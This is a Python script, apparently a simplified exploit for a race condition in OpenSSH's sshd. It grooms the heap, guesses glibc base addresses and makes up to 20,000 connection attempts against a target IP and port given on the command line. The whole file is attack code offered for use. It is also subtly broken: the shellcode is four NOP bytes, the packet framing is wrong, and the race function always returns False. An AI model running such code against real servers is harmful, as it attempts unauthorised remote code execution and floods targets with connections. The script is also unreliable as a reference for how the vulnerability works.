import socket
import time
import struct
import random

# Constants
MAX_PACKET_SIZE = 256 * 1024
LOGIN_GRACE_TIME = 120
MAX_STARTUPS = 100
GLIBC_BASES = [0xb7200000, 0xb7400000]
SHELLCODE = b"\x90\x90\x90\x90"

# Functions to send and receive data
def send_packet(sock, packet_type, data):
    packet_len = len(data) + 5
    packet = struct.pack('>I', packet_len) + bytes([packet_type]) + data
    sock.sendall(packet)

def send_ssh_version(sock):
    ssh_version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
    sock.sendall(ssh_version)

def receive_ssh_version(sock):
    buffer = sock.recv(256)
    if buffer:
        print(f"Received SSH version: {buffer.decode().strip()}")
        return True
    else:
        print("Failed to receive SSH version")
        return False

def send_kex_init(sock):
    kexinit_payload = b'\x00' * 36
    send_packet(sock, 20, kexinit_payload)

def receive_kex_init(sock):
    buffer = sock.recv(1024)
    if buffer:
        print(f"Received KEX_INIT ({len(buffer)} bytes)")
        return True
    else:
        print("Failed to receive KEX_INIT")
        return False

def perform_ssh_handshake(sock):
    send_ssh_version(sock)
    if not receive_ssh_version(sock):
        return False
    send_kex_init(sock)
    if not receive_kex_init(sock):
        return False
    return True

def prepare_heap(sock):
    for _ in range(10):
        tcache_chunk = b'\x00' * 8
        send_packet(sock, 90, tcache_chunk)

def time_final_packet(sock):
    final_packet = b'\x00' * 36
    iterations = 100
    total_time = 0

    for _ in range(iterations):
        start = time.monotonic()
        send_packet(sock, 20, final_packet)
        end = time.monotonic()
        total_time += (end - start) * 1000

    average_time = total_time / iterations
    print(f"Average parsing time: {average_time:.2f} ms")
    return average_time

def attempt_race_condition(sock, parsing_time, glibc_base):
    trigger_time = parsing_time / 1000  # Convert to seconds

    for _ in range(5):
        time.sleep(trigger_time)
        malicious_packet = b'\x00' * 36 + struct.pack('<Q', glibc_base) + SHELLCODE
        send_packet(sock, 20, malicious_packet)

    return False

def setup_connection(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((ip, port))
    return sock

def main(ip, port):
    parsing_time = 0
    success = False

    for glibc_base in GLIBC_BASES:
        print(f"Attempting exploitation with glibc base: 0x{glibc_base:x}")

        for attempt in range(20000):
            if attempt % 1000 == 0:
                print(f"Attempt {attempt} of 20000")

            try:
                sock = setup_connection(ip, port)
            except Exception as e:
                print(f"Failed to establish connection, attempt {attempt}: {e}")
                continue

            if not perform_ssh_handshake(sock):
                print(f"SSH handshake failed, attempt {attempt}")
                sock.close()
                continue

            prepare_heap(sock)
            parsing_time = time_final_packet(sock)

            if attempt_race_condition(sock, parsing_time, glibc_base):
                print(f"Possible exploitation success on attempt {attempt} with glibc base 0x{glibc_base:x}!")
                success = True
                sock.close()
                break

            sock.close()
            time.sleep(0.1)  # 100ms delay between attempts

        if success:
            break

    return not success

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])

    main(ip, port)
